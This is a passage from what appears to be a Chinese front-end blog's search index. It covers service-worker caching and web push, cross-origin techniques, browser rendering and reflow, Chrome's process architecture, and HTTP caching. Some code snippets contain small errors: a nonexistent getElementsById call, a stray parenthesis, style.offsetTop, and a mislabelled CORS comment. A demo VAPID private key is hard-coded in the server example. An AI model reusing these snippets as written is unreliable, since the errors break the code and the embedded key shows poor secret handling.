是否匹配当前缓存中存在的任何内容。如果存在的话，返回缓存的资源。如果资源并不存在于缓存当中，通过网络来获取资源，并将获取到的资源添加到缓存中。*/self.addEventListener(&#x27;fetch&#x27;, function (event) &#123;  event.respondWith(    caches.match(event.request)                      .then(function (response) &#123;      if (response) &#123;                                    return response;                               &#125;      var requestToCache = event.request.clone();  //                return fetch(requestToCache).then(                           function (response) &#123;          if (!response || response.status !== 200) &#123;                  return response;          &#125;          var responseToCache = response.clone();                    caches.open(cacheName)                                       .then(function (cache) &#123;              cache.put(requestToCache, responseToCache);              &#125;);          return response;                 &#125;)  );&#125;);\n\n\n注：为什么用request.clone()和response.clone()需要这么做是因为request和response是一个流，它只能消耗一次。因为我们已经通过缓存消耗了一次，然后发起 HTTP 请求还要再消耗一次，所以我们需要在此时克隆请求Clone the request—a request is a stream and can only be consumed once\n\n2.2.5 调试相关\nchrome浏览器打开https://googlechrome.github.io/samples/service-worker/basic/index.html，这是一个实现了service worker离线缓存功能的网站，打开调试工具\n\n\n\n勾选可以模拟网站离线情况，勾选后network会有一个黄色警告图标，该网站已经离线。此时刷新页面，页面仍然能够正常显示\n当前service worker的scope。它能够拦截https://googlechrome.github.i…，同样也能够拦截https://googlechrome.github.i...&#x2F;.html下的请求\n\n\n调试面板具体代表的什么参看 https://x5.tencent.com/tbs/guide/serviceworker.html的第三部分\n\n2.3 serice worker实现消息推送\n\n步骤一、提示用户并获得他们的订阅详细信息\n步骤二、将这些详细信息保存在服务器上\n步骤三、在需要时发送任何消息\n\n\n不同浏览器需要用不同的推送消息服务器。以 Chrome 上使用 Google Cloud Messaging 作为推送服务为例，第一步是注册 applicationServerKey(通过 GCM 注册获取)，并在页面上进行订阅或发起订阅。每一个会话会有一个独立的端点（endpoint），订阅对象的属性(PushSubscription.endpoint) 即为端点值。将端点发送给服务器后，服务器用这一值来发送消息给会话的激活的 Service Worker （通过 GCM 与浏览器客户端沟通\n\n步骤一和步骤二\n&lt;!--index.html--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Progressive Times&lt;/title&gt;    &lt;link rel=&quot;manifest&quot; href=&quot;/manifest.json&quot;&gt;                                        &lt;/head&gt;  &lt;body&gt;    &lt;script&gt;      var endpoint;      var key;      var authSecret;      var vapidPublicKey = &#x27;BAyb_WgaR0L0pODaR7wWkxJi__tWbM1MPBymyRDFEGjtDCWeRYS9EF7yGoCHLdHJi6hikYdg4MuYaK0XoD0qnoY&#x27;;      // 方法很复杂，但是可以不用具体看，知识用来转化vapidPublicKey用      function urlBase64ToUint8Array(base64String) &#123;                                          const padding = &#x27;=&#x27;.repeat((4 - base64String.length % 4) % 4);        const base64 = (base64String + padding)          .replace(/\\-/g, &#x27;+&#x27;)          .replace(/_/g, &#x27;/&#x27;);        const rawData = window.atob(base64);        const outputArray = new Uint8Array(rawData.length);        for (let i = 0; i &lt; rawData.length; ++i) &#123;          outputArray[i] = rawData.charCodeAt(i);        &#125;        return outputArray;      &#125;      if (&#x27;serviceWorker&#x27; in navigator) &#123;        navigator.serviceWorker.register(&#x27;sw.js&#x27;).then(function (registration) &#123;          return registration.pushManager.getSubscription()                                        .then(function (subscription) &#123;              if (subscription) &#123;                                                                      return;              &#125;              return registration.pushManager.subscribe(&#123;                                                userVisibleOnly: true,                  applicationServerKey: urlBase64ToUint8Array(vapidPublicKey)                &#125;)                .then(function (subscription) &#123;                  var rawKey = subscription.getKey ? subscription.getKey(&#x27;p256dh&#x27;) : &#x27;&#x27;;                  key = rawKey ? btoa(String.fromCharCode.apply(null, new Uint8Array(rawKey))) : &#x27;&#x27;;                  var rawAuthSecret = subscription.getKey ? subscription.getKey(&#x27;auth&#x27;) : &#x27;&#x27;;                  authSecret = rawAuthSecret ?                    btoa(String.fromCharCode.apply(null, new Uint8Array(rawAuthSecret))) : &#x27;&#x27;;                  endpoint = subscription.endpoint;                  return fetch(&#x27;./register&#x27;, &#123;                                                             method: &#x27;post&#x27;,                    headers: new Headers(&#123;                      &#x27;content-type&#x27;: &#x27;application/json&#x27;                    &#125;),                    body: JSON.stringify(&#123;                      endpoint: subscription.endpoint,                      key: key,                      authSecret: authSecret,                    &#125;),                  &#125;);                &#125;);            &#125;);        &#125;).catch(function (err) &#123;          // 注册失败 :(          console.log(&#x27;ServiceWorker registration failed: &#x27;, err);        &#125;);      &#125;    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;\n\n步骤三 服务器发送消息给service worker\n// app.jsconst webpush = require(&#x27;web-push&#x27;);                 const express = require(&#x27;express&#x27;);var bodyParser = require(&#x27;body-parser&#x27;);const app = express();webpush.setVapidDetails(                               &#x27;mailto:contact@deanhume.com&#x27;,  &#x27;BAyb_WgaR0L0pODaR7wWkxJi__tWbM1MPBymyRDFEGjtDCWeRYS9EF7yGoCHLdHJi6hikYdg4MuYaK0XoD0qnoY&#x27;,  &#x27;p6YVD7t8HkABoez1CvVJ5bl7BnEdKUu5bSyVjyxMBh0&#x27;);app.post(&#x27;/register&#x27;, function (req, res) &#123;             var endpoint = req.body.endpoint;  saveRegistrationDetails(endpoint, key, authSecret);   const pushSubscription = &#123;                              endpoint: req.body.endpoint,    keys: &#123;      auth: req.body.authSecret,      p256dh: req.body.key    &#125;  &#125;;  var body = &#x27;Thank you for registering&#x27;;  var iconUrl = &#x27;https://example.com/images/homescreen.png&#x27;;  // 发送 Web 推送消息  webpush.sendNotification(pushSubscription,                JSON.stringify(&#123;        msg: body,        url: &#x27;http://localhost:3111/&#x27;,        icon: iconUrl      &#125;))    .then(result =&gt; res.sendStatus(201))    .catch(err =&gt; &#123;      console.log(err);    &#125;);&#125;);app.listen(3111, function () &#123;  console.log(&#x27;Web push app listening on port 3111!&#x27;)&#125;);\n\n\nservice worker监听push事件，将通知详情推送给用户\n\n// service-worker.jsself.addEventListener(&#x27;push&#x27;, function (event) &#123; // 检查服务端是否发来了任何有效载荷数据  var payload = event.data ? JSON.parse(event.data.text()) : &#x27;no payload&#x27;;  var title = &#x27;Progressive Times&#x27;;  event.waitUntil(    // 使用提供的信息来显示 Web 推送通知    self.registration.showNotification(title, &#123;                                 body: payload.msg,      url: payload.url,      icon: payload.icon    &#125;)  );&#125;);\n\n三、参考\n网站渐进式增强体验(PWA)改造：Service Worker 应用详解\nPWA实战：面向下一代的Progressive Web APP\nService Worker最佳实践\n使用 Service Worker 做一个 PWA 离线网页应用\n理解Service Worker\n前端er来学习一下 WebWorker\nService Worker学习与实践（二）——PWA简介\nService Worker学习与实践（三）——消息推送\npwa-tutoria\n\n","categories":["浏览器"],"tags":["浏览器"]},{"title":"浏览器安全插箱跨域","url":"/2021/04/29/%E6%B5%8F%E8%A7%88%E5%99%A8/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%8F%92%E7%AE%B1%E8%B7%A8%E5%9F%9F/","content":"什么是跨域？\n\n概念如下：只要协议、域名、端口有任何一个不同，都被当作是不同的域\n\n下面是具体的跨域情况详解\n\n\n\nURL\n说明\n是否允许通信\n\n\n\nhttp://www.a.com/a.js、http://www.a.com/b.js\n同一域名下\n允许\n\n\nhttp://www.a.com/lab/a.js、http://www.a.com/script/b.js\n同一域名下不同文件夹\n允许\n\n\nhttp://www.a.com:8000/a.js、http://www.a.com/b.js\n同一域名，不同端口\n不允许\n\n\nhttp://www.a.com/a.js、https://www.a.com/b.js\n同一域名，不同协议\n不允许\n\n\nhttp://www.a.com/a.js、http://70.32.92.74/b.js\n域名和域名对应ip\n不允许\n\n\nhttp://www.a.com/a.js、http://script.a.com/b.js\n主域相同，子域不同\n不允许（cookie这种情况下也不允许访问）\n\n\nhttp://www.a.com/a.js、http://a.com/b.js\n同一域名，不同二级域名（同上）\n不允许（cookie这种情况下也不允许访问）\n\n\nhttp://www.cnblogs.com/a.js、http://www.a.com/b.js\n不同域名\n不允许\n\n\n一、document.domain跨域\n\n原理：相同主域名不同子域名下的页面，可以设置document.domain让它们同域\n限制：同域document提供的是页面间的互操作，需要载入iframe页面\n\n\n下面几个域名下的页面都是可以通过document.domain跨域互操作的： http://a.com/foo, http://b.a.com/bar, http://c.a.com/bar。 但只能以页面嵌套的方式来进行页面互操作，比如常见的iframe方式就可以完成页面嵌套\n\n// URL http://a.com/foovar ifr = document.createElement(&#x27;iframe&#x27;);ifr.src = &#x27;http://b.a.com/bar&#x27;; ifr.onload = function()&#123;    var ifrdoc = ifr.contentDocument || ifr.contentWindow.document;    ifrdoc.getElementsById(&quot;foo&quot;).innerHTML);&#125;;ifr.style.display = &#x27;none&#x27;;document.body.appendChild(ifr);\n\n\n上述代码所在的URL是http://a.com/foo，它对http://b.a.com/bar的DOM访问要求后者将 document.domain往上设置一级\n\n// URL http://b.a.com/bardocument.domain = &#x27;a.com&#x27;\n\n\ndocument.domain只能从子域设置到主域，往下设置以及往其他域名设置都是不允许的， 在Chrome中给出的错误是这样的\n\nUncaught DOMException: Failed to set the &#x27;domain&#x27; property on &#x27;Document&#x27;: &#x27;baidu.com&#x27; is not a suffix of &#x27;b.a.com&#x27;\n\n二、有src的标签\n\n原理：所有具有src属性的HTML标签都是可以跨域的，包括, \n限制：需要创建一个DOM对象，只能用于GET方法\n\n\n\n在document.body中append一个具有src属性的HTML标签， src属性值指向的URL会以GET方法被访问，该访问是可以跨域的\n其实样式表的&#96;&#96;标签也是可以跨域的，只要是有src或href的HTML标签都有跨域的能力\n\n\n\n不同的HTML标签发送HTTP请求的时机不同，例如&#96;&#96;在更改src属性时就会发送请求，而script, iframe, link[rel=stylesheet]只有在添加到DOM树之后才会发送HTTP请求：\n\nvar img = new Image();img.src = &#x27;http://some/picture&#x27;;        // 发送HTTP请求var ifr = $(&#x27;&lt;iframe&gt;&#x27;, &#123;src: &#x27;http://b.a.com/bar&#x27;&#125;);$(&#x27;body&#x27;).append(ifr);                  // 发送HTTP请求\n\n三、JSONP\n\n原理：&#96;&#96;是可以跨域的，而且在跨域脚本中可以直接回调当前脚本的函数\n限制：需要创建一个DOM对象并且添加到DOM树，只能用于GET方法\n\n\nJSONP利用的是&#96;&#96;可以跨域的特性，跨域URL返回的脚本不仅包含数据，还包含一个回调\n\n// URL: http://b.a.com/foovar data = &#123;    foo: &#x27;bar&#x27;,    bar: &#x27;foo&#x27;&#125;;callback(data);\n\n\n然后在我们在主站http://a.com中，可以这样来跨域获取http://b.a.com的数据：\n\n// URL: http://a.com/foovar callback = function(data)&#123;    // 处理跨域请求得到的数据&#125;;var script = $(&#x27;&lt;script&gt;&#x27;, &#123;src: &#x27;http://b.a.com/bar&#x27;&#125;);$(&#x27;body&#x27;).append(script);\n\n\n其实jQuery已经封装了JSONP的使用，我们可以这样来\n\n$.getJSON( &quot;http://b.a.com/bar?callback=callback&quot;, function( data )&#123;    // 处理跨域请求得到的数据&#125;);\n\n\n$.getJSON与$.get的区别是前者会把responseText转换为JSON，而且当URL具有callback参数时， jQuery将会把它解释为一个JSONP请求，创建一个&#96;&#96;标签来完成该请求\n\n四、navigation 对象\n\n原理：iframe之间是共享navigator对象的，用它来传递信息\n要求：IE6/7\n\n\n有些人注意到了IE6/7的一个漏洞：iframe之间的window.navigator对象是共享的。 我们可以把它作为一个Messenger，通过它来传递信息。比如一个简单的委托：\n\n// a.comnavigation.onData()&#123;    // 数据到达的处理函数&#125;typeof navigation.getData === &#x27;function&#x27;     || navigation.getData()// b.comnavigation.getData = function()&#123;    $.get(&#x27;/path/under/b.com&#x27;)        .success(function(data)&#123;            typeof navigation.onData === &#x27;function&#x27;                || navigation.onData(data)        &#125;);&#125;\n\n\n与document.navigator类似，window.name也是当前窗口所有页面所共享的。也可以用它来传递信息。 同样蛋疼的办法还有传递Hash（有些人叫锚点），这是因为每次浏览器打开一个URL时，URL后面的#xxx部分会保留下来，那么新的页面可以从这里获得上一个页面的数据\n\n五、跨域资源共享（CORS）\n\n原理：服务器设置Access-Control-Allow-OriginHTTP响应头之后，浏览器将会允许跨域请求\n限制：浏览器需要支持HTML5，可以支持POST，PUT等方法\n\n\n前面提到的跨域手段都是某种意义上的Hack， HTML5标准中提出的跨域资源共享（Cross Origin Resource Share，CORS）才是正道。 它支持其他的HTTP方法如PUT, POST等，可以从本质上解决跨域问题。\n\n\n例如，从http://a.com要访问http://b.com的数据，通常情况下Chrome会因跨域请求而报错\n\nXMLHttpRequest cannot load http://b.com. No &#x27;Access-Control-Allow-Origin&#x27; header is present on the requested resource. Origin &#x27;http://a.com&#x27; is therefore not allowed access\n\n\n错误原因是被请求资源没有设置Access-Control-Allow-Origin，所以我们在b.com的服务器中设置这个响应头字段即可\n\nAccess-Control-Allow-Origin: *              # 允许所有域名访问，或者Access-Control-Allow-Origin: http://a.com   # 只允许所有域名访问\n\n六、window.postMessage\n\n原理：HTML5允许窗口之间发送消息\n限制：浏览器需要支持HTML5，获取窗口句柄后才能相互通信\n\n\n这是一个安全的跨域通信方法，postMessage(message,targetOrigin)也是HTML5引入的特性。 可以给任何一个window发送消息，不论是否同源。第二个参数可以是*但如果你设置了一个URL但不相符，那么该事件不会被分发。看一个普通的使用方式吧\n\n// URL: http://a.com/foovar win = window.open(&#x27;http://b.com/bar&#x27;);win.postMessage(&#x27;Hello, bar!&#x27;, &#x27;http://b.com&#x27;);// URL: http://b.com/barwindow.addEventListener(&#x27;message&#x27;,function(event) &#123;    console.log(event.data);&#125;);\n\n七、访问控制安全的讨论\n\n在HTML5之前，JSONP已经成为跨域的事实标准了，jQuery都给出了支持。 值得注意的是它只是Hack，并没有产生额外的安全问题。 因为JSONP要成功获取数据，需要跨域资源所在服务器的配合，比如资源所在服务器需要自愿地回调一个合适的函数，所以服务器仍然有能力控制资源的跨域访问\n跨域的正道还是要使用HTML5提供的CORS头字段以及window.postMessage， 可以支持POST, PUT等HTTP方法，从机制上解决跨域问题。 值得注意的是Access-Control-Allow-Origin头字段是资源所在服务器设置的， 访问控制的责任仍然是在提供资源的服务器一方，这和JSONP是一样的\n\n","categories":["浏览器"],"tags":["浏览器"]},{"title":"浏览器渲染原理","url":"/2021/05/19/%E6%B5%8F%E8%A7%88%E5%99%A8/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86/","content":"一、浏览器如何渲染网页概述：浏览器渲染一共有五步\n\n处理 HTML 并构建 DOM 树。\n处理 CSS构建 CSSOM 树。\n将 DOM 与 CSSOM 合并成一个渲染树。\n根据渲染树来布局，计算每个节点的位置。\n调用 GPU 绘制，合成图层，显示在屏幕上\n\n\n第四步和第五步是最耗时的部分，这两步合起来，就是我们通常所说的渲染\n\n具体如下图过程如下图所示\n\n\n渲染\n\n网页生成的时候，至少会渲染一次\n在用户访问的过程中，还会不断重新渲染\n\n\n重新渲染需要重复之前的第四步(重新生成布局)+第五步(重新绘制)或者只有第五个步(重新绘制)\n\n\n在构建 CSSOM 树时，会阻塞渲染，直至 CSSOM树构建完成。并且构建 CSSOM 树是一个十分消耗性能的过程，所以应该尽量保证层级扁平，减少过度层叠，越是具体的 CSS 选择器，执行速度越慢\n当 HTML 解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。也就是说，如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件。并且CSS也会影响 JS 的执行，只有当解析完样式表才会执行 JS，所以也可以认为这种情况下，CSS 也会暂停构建 DOM\n\n二、浏览器渲染五个阶段2.1 第一步：解析HTML标签，构建DOM树\n在这个阶段，引擎开始解析html，解析出来的结果会成为一棵dom树dom的目的至少有2个\n\n\n作为下个阶段渲染树状图的输入\n成为网页和脚本的交互界面。(最常用的就是getElementById等等)\n\n当解析器到达script标签的时候，发生下面四件事情\n\nhtml解析器停止解析,\n如果是外部脚本，就从外部网络获取脚本代码\n将控制权交给js引擎，执行js代码\n恢复html解析器的控制权\n\n\n由此可以得到第一个结论1\n\n\n由于&#96;&#96;标签是阻塞解析的，将脚本放在网页尾部会加速代码渲染。\ndefer和async属性也能有助于加载外部脚本。\ndefer使得脚本会在dom完整构建之后执行；\nasync标签使得脚本只有在完全available才执行，并且是以非阻塞的方式进行的\n\n2.2 第二步：解析CSS标签，构建CSSOM树\n我们已经看到html解析器碰到脚本后会做的事情，接下来我们看下html解析器碰到样式表会发生的情况\njs会阻塞解析，因为它会修改文档(document)。css不会修改文档的结构，如果这样的话，似乎看起来css样式不会阻塞浏览器html解析。但是事实上 css样式表是阻塞的。阻塞是指当cssom树建立好之后才会进行下一步的解析渲染\n\n通过以下手段可以减轻cssom带来的影响\n\n将script脚本放在页面底部\n尽可能快的加载css样式表\n将样式表按照media type和media query区分，这样有助于我们将css资源标记成非阻塞渲染的资源。\n非阻塞的资源还是会被浏览器下载，只是优先级较低\n\n2.3 第三步：把DOM和CSSOM组合成渲染树（render tree）\n2.4 第四步：在渲染树的基础上进行布局，计算每个节点的几何结构\n布局(layout)：定位坐标和大小，是否换行，各种position, overflow, z-index属性\n\n2.5 调用 GPU 绘制，合成图层，显示在屏幕上\n将渲染树的各个节点绘制到屏幕上，这一步被称为绘制painting\n\n三、渲染优化相关3.1 Load 和 DOMContentLoaded 区别\nLoad 事件触发代表页面中的 DOM，CSS，JS，图片已经全部加载完毕。\nDOMContentLoaded 事件触发代表初始的 HTML 被完全加载和解析，不需要等待 CSS，JS，图片加载\n\n3.2 图层\n一般来说，可以把普通文档流看成一个图层。特定的属性可以生成一个新的图层。不同的图层渲染互不影响，所以对于某些频繁需要渲染的建议单独生成一个新图层，提高性能。但也不能生成过多的图层，会引起反作用。\n\n通过以下几个常用属性可以生成新图层\n\n3D 变换：translate3d、translateZ\nwill-change\nvideo、iframe 标签\n通过动画实现的 opacity 动画转换\nposition: fixed\n\n3.3 重绘（Repaint）和回流（Reflow）\n重绘和回流是渲染步骤中的一小节，但是这两个步骤对于性能影响很大\n\n\n重绘是当节点需要更改外观而不会影响布局的，比如改变 color 就叫称为重绘\n回流是布局或者几何属性需要改变就称为回流。\n\n\n回流必定会发生重绘，重绘不一定会引发回流。回流所需的成本比重绘高的多，改变深层次的节点很可能导致父节点的一系列回流\n\n以下几个动作可能会导致性能问题\n\n改变 window 大小\n改变字体\n添加或删除样式\n文字改变\n定位或者浮动\n盒模型\n\n很多人不知道的是，重绘和回流其实和 Event loop 有关\n\n当 Event loop 执行完Microtasks 后，会判断 document 是否需要更新。因为浏览器是 60Hz 的刷新率，每 16ms 才会更新一次。\n然后判断是否有 resize 或者 scroll ，有的话会去触发事件，所以 resize 和 scroll 事件也是至少 16ms才会触发一次，并且自带节流功能。\n判断是否触发了 media query\n更新动画并且发送事件\n判断是否有全屏操作事件\n执行 requestAnimationFrame 回调\n执行 IntersectionObserver 回调，该方法用于判断元素是否可见，可以用于懒加载上，但是兼容性不好\n更新界面\n以上就是一帧中可能会做的事情。如果在一帧中有空闲时间，就会去执行 requestIdleCallback 回调\n\n常见的引起重绘的属性\n\ncolor\nborder-style\nvisibility\nbackground\ntext-decoration\nbackground-image\nbackground-position\nbackground-repeat\noutline-color\noutline\noutline-style\nborder-radius\noutline-width\nbox-shadow\nbackground-size\n\n3.4 常见引起回流属性和方法\n任何会改变元素几何信息(元素的位置和尺寸大小)的操作，都会触发重排，下面列一些栗子\n\n\n添加或者删除可见的DOM元素；\n元素尺寸改变——边距、填充、边框、宽度和高度\n内容变化，比如用户在input框中输入文字\n浏览器窗口尺寸改变——resize事件发生时\n计算 offsetWidth 和 offsetHeight 属性\n设置 style 属性的值\n\n回流影响的范围\n\n由于浏览器渲染界面是基于流失布局模型的，所以触发重排时会对周围DOM重新排列，影响的范围有两种\n\n\n全局范围：从根节点html开始对整个渲染树进行重新布局。\n局部范围：对渲染树的某部分或某一个渲染对象进行重新布局\n\n全局范围回流\n&lt;body&gt;  &lt;div class=&quot;hello&quot;&gt;    &lt;h4&gt;hello&lt;/h4&gt;    &lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt;BDing&lt;/p&gt;    &lt;h5&gt;male&lt;/h5&gt;    &lt;ol&gt;      &lt;li&gt;coding&lt;/li&gt;      &lt;li&gt;loving&lt;/li&gt;    &lt;/ol&gt;  &lt;/div&gt;&lt;/body&gt;\n\n\n当p节点上发生reflow时，hello和body也会重新渲染，甚至h5和ol都会收到影响\n\n局部范围回流\n\n用局部布局来解释这种现象：把一个dom的宽高之类的几何信息定死，然后在dom内部触发重排，就只会重新渲染该dom内部的元素，而不会影响到外界\n\n3.5 减少重绘和回流\n使用 translate 替代 top\n\n&lt;div class=&quot;test&quot;&gt;&lt;/div&gt;&lt;style&gt;    .test &#123;        position: absolute;        top: 10px;        width: 100px;        height: 100px;        background: red;    &#125;&lt;/style&gt;&lt;script&gt;    setTimeout(() =&gt; &#123;        // 引起回流        document.querySelector(&#x27;.test&#x27;).style.top = &#x27;100px&#x27;    &#125;, 1000)&lt;/script&gt;\n\n\n使用 visibility 替换 display: none ，因为前者只会引起重绘，后者会引发回流（改变了布局）\n把 DOM 离线后修改，比如：先把 DOM 给 display:none (有一次 Reflow)，然后你修改100次，然后再把它显示出来\n不要把 DOM 结点的属性值放在一个循环里当成循环里的变量\n\nfor(let i = 0; i &lt; 1000; i++) &#123;    // 获取 offsetTop 会导致回流，因为需要去获取正确的值    console.log(document.querySelector(&#x27;.test&#x27;).style.offsetTop)&#125;\n\n\n不要使用 table 布局，可能很小的一个小改动会造成整个 table 的重新布局\n动画实现的速度的选择，动画速度越快，回流次数越多，也可以选择使用 requestAnimationFrame\nCSS选择符从右往左匹配查找，避免 DOM深度过深\n将频繁运行的动画变为图层，图层能够阻止该节点回流影响别的元素。比如对于 video标签，浏览器会自动将该节点变为图层。\n\n\n\n\n重绘与回流\n\n","categories":["浏览器"],"tags":["浏览器"]},{"title":"浏览器组成与架构","url":"/2021/05/27/%E6%B5%8F%E8%A7%88%E5%99%A8/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BB%84%E6%88%90%E4%B8%8E%E6%9E%B6%E6%9E%84/","content":"组成​        浏览器由shell（用户界面、网络、UI后端、JavaScript解释器、XML解析器、数据存储）和内核（浏览器引擎、渲染引擎）组成，内核是浏览器的核心。不同的浏览器有不同的内核，ie 浏览器是 Trident，Firefox 浏览器是 Geoko（Mozilla自主研发的渲染引擎），Safari 和 Chrome 使用的是 webkit （后来 Chrome 推出了 Blink）。\n用户界面（User Interface）    用户界面主要包括工具栏、地址栏、前进/后退按钮、书签菜单、可视化页面加载进度、智能下载处理、首选项、打印等。除了浏览器主窗口显示请求的页面之外，其他显示的部分都属于用户界面。\n\n    用户界面还可以与桌面环境集成，以提供浏览器会话管理或与其他桌面应用程序的通信。\n\n网络（Networking）    网络系统实现HTTP和FTP等文件传输协议。 网络系统可以在不同的字符集之间进行转换，为文件解析MIME媒体类型。 网络系统可以实现最近检索资源的缓存功能。\n\nUI后端（Display Backend）    UI后端提供绘图和窗口原语，包括：用户界面控件集合、字体集合。\n\nJavaScript解释器（JavaScript Interpreter）    JavaScript解释器能够解释并执行嵌入在网页中的JavaScript（又称ECMAScript）代码。 为了安全起见，浏览器引擎或渲染引擎可能会禁用某些JavaScript功能，如弹出窗口的打开。\n\nXML解析器（XML Parser）    XML解析器可以将XML文档解析成文档对象模型（Document Object Model，DOM）树。 XML解析器是浏览器架构中复用最多的子系统之一，几乎所有的浏览器实现都利用现有的XML解析器，而不是从头开始创建自己的XML解析器。\n\n数据存储（Data Persistence）    数据存储将与浏览会话相关联的各种数据存储在硬盘上。 这些数据可能是诸如：书签、工具栏设置等这样的高级数据，也可能是诸如：Cookie，安全证书、缓存等这样的低级数据。\n\n浏览器引擎（Browser Engine）    浏览器引擎是一个可嵌入的组件，其为渲染引擎提供高级接口。浏览器引擎可以加载一个给定的URI，并支持诸如：前进/后退/重新加载等浏览操作。浏览器引擎提供查看浏览会话的各个方面的挂钩，例如：当前页面加载进度、JavaScript alert。浏览器引擎还允许查询/修改渲染引擎设置。\n\n渲染引擎（Rendering Engine 或 layout engineer）    渲染引擎负责取得网页的内容（HTML、XML、图像等等）、整理讯息（例如加入CSS等），以及计算网页的显示方式，然后会输出至显示器或打印机。渲染引擎能够显示HTML和XML文档，可选择CSS样式，以及嵌入式内容（如图片）。渲染引擎能够准确计算页面布局，可使用“回流”算法逐步调整页面元素的位置。渲染引擎内部包含HTML解析器。\n\n软件构造​        不同的浏览器软件架构也不一样，好的软件都是支持多进程和多线程，进程与进程相互独立，不同的进程之间通过IPC（Inter Process Communication）进行通信。\n    以 Chrome 浏览器为例，它的架构模式由浏览器进程（Browser Process）、渲染进程（Renderer Process）、插件进程（Plugin Process）、GPU进程（GPU Process）、网络进程（NetWork Process）和其他进程组成，每个进程都有自己核心的职责，它们相互配合完成浏览器的整体功能，每个进程中又包含多个线程，一个进程内的多个线程也会协同工作，配合完成所在进程的职责。和大多数浏览器不同，Chrome 浏览器的每个标签页都分别对应一个渲染引擎实例。每个标签页都是一个独立的进程，当标签页的数量足够多时（40个页面以上），会与之前的标签页共用同一个进程。\n\n浏览器进程（Browser Process）    主要负责界面显示、用户交互、子进程管理，同时提供存储等功能。控制应用程序的 chrome 部分，包括地址栏、书签、后退和前进等按钮，还处理Web浏览器的隐形、底层操作，例如网络请求和文件访问。 \n\n渲染进程（Renderer Process）    核心任务是将 HTML、CSS 和 JavaScript 转换为用户可以与之交互的网页，渲染引擎 Blink 和 JavaScript 引擎 V8 都是运行在该进程中，默认情况下，Chrome 会为每个 Tab 标签创建一个渲染进程。\n\nGPU 进程（GPU Process）    GPU 进程的使用初衷是为了实现 3D CSS 的效果，随后网页、Chrome 的 UI 界面都选择采用 GPU 来绘制。\n\n网络进程（NetWork Process）    主要负责页面的网络资源加载。\n\n插件进程（Plugin Process）    主要是负责插件的运行，因插件易崩溃，所以需要通过插件进程来隔离，以保证插件进程崩溃不会对浏览器和页面造成影响。\n\nutility进程（Utility Process）    有时候浏览器主进程需要做一些“危险”的事情，比如图片解码、文件解压缩。如果这些“危险”的操作发生了失败，会导致整个主进程发生异常崩溃，这是我们不愿意看到的。因此Chromium设计出了一个utility进程的机制。主进程临时需要做一些不方便的任务的情况下，可以启动一个utility进程来代替主进程执行，主进程与utility进程之间通过IPC消息来通信。\n\n其他进程    UI进程、存储进程、备进程、Audio进程、Video进程、Profile进程等等。\n\n面向服务架构        面向服务架构（Services Oriented Architecture，简称 SOA），后端技术开发中比较火热的微服务架构就是 SOA 的一种变体，Chrome 官方团队将原来的各种模块重构成独立的服务（Service），访问服务（Service）必须使用定义好的接口，通过 IPC 来通信，每个服务（Service）都可以在独立的进程中运行，并且可以轻松拆分为不同的进程或聚合为一个进程。当Chrome在功能强大的硬件上运行时，它可能会将每个服务拆分为不同的进程以提供更高的稳定性，但是如果是在资源受限的设备上，Chrome 会将服务整合到一个进程中以节省内存。\n    在最新的 Chrome 浏览器中，可以在设置中打开更多工具，找到任务管理器并打开。\n\n\n\n     可以看到有部分的 Chrome Service 与进程同时在运行，Chrome 仍在努力的完善面向服务架构。\n\n","categories":["浏览器"],"tags":["浏览器"]},{"title":"浏览器缓存原理","url":"/2021/05/07/%E6%B5%8F%E8%A7%88%E5%99%A8/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E5%8E%9F%E7%90%86/","content":"一、浏览器缓存基本认识分为强缓存和协商缓存\n\n浏览器在加载资源时，先根据这个资源的一些http header判断它是否命中强缓存，强缓存如果命中，浏览器直接从自己的缓存中读取资源，不会发请求到服务器。比如某个css文件，如果浏览器在加载它所在的网页时，这个css文件的缓存配置命中了强缓存，浏览器就直接从缓存中加载这个css，连请求都不会发送到网页所在服务器\n当强缓存没有命中的时候，浏览器一定会发送一个请求到服务器，通过服务器端依据资源的另外一些http header验证这个资源是否命中协商缓存，如果协商缓存命中，服务器会将这个请求返回，但是不会返回这个资源的数据，而是告诉客户端可以直接从缓存中加载这个资源，于是浏览器就又会从自己的缓存中去加载这个资源\n强缓存与协商缓存的共同点是：如果命中，都是从客户端缓存中加载资源，而不是从服务器加载资源数据；区别是：强缓存不发请求到服务器，协商缓存会发请求到服务器\n当协商缓存也没有命中的时候，浏览器直接从服务器加载资源数据\n\n二、强缓存的原理2.1 介绍\n当浏览器对某个资源的请求命中了强缓存时，返回的http状态为200，在chrome的开发者工具的network里面size会显示为from cache，比如京东的首页里就有很多静态资源配置了强缓存，用chrome打开几次，再用f12查看network，可以看到有不少请求就是从缓存中加载的\n\n\n\n强缓存是利用Expires或者Cache-Control这两个http response header实现的，它们都用来表示资源在客户端缓存的有效期。\n\n\nExpires`是`http1.0`提出的一个表示资源过期时间的`header`，它描述的是一个绝对时间，由服务器返回，用`GMT`格式的字符串表示，如：`Expires:Thu, 31 Dec 2037 23:55:55 GMT\n\n2.2 Expires缓存原理\n浏览器第一次跟服务器请求一个资源，服务器在返回这个资源的同时，在respone的header加上Expires，如\n\n\n\n浏览器在接收到这个资源后，会把这个资源连同所有response header一起缓存下来（所以缓存命中的请求返回的header并不是来自服务器，而是来自之前缓存的header）\n浏览器再请求这个资源时，先从缓存中寻找，找到这个资源后，拿出它的Expires跟当前的请求时间比较，如果请求时间在Expires指定的时间之前，就能命中缓存，否则就不行\n如果缓存没有命中，浏览器直接从服务器加载资源时，Expires Header在重新加载的时候会被更新\n\n\nExpires`是较老的强缓存管理`header`，由于它是服务器返回的一个绝对时间，在服务器时间与客户端时间相差较大时，缓存管理容易出现问题，比如随意修改下客户端时间，就能影响缓存命中的结果。所以在`http1.1`的时候，提出了一个新的`header`，就是`Cache-Control`，这是一个相对时间，在配置缓存的时候，以秒为单位，用数值表示，如：`Cache-Control:max-age=315360000\n\n2.3 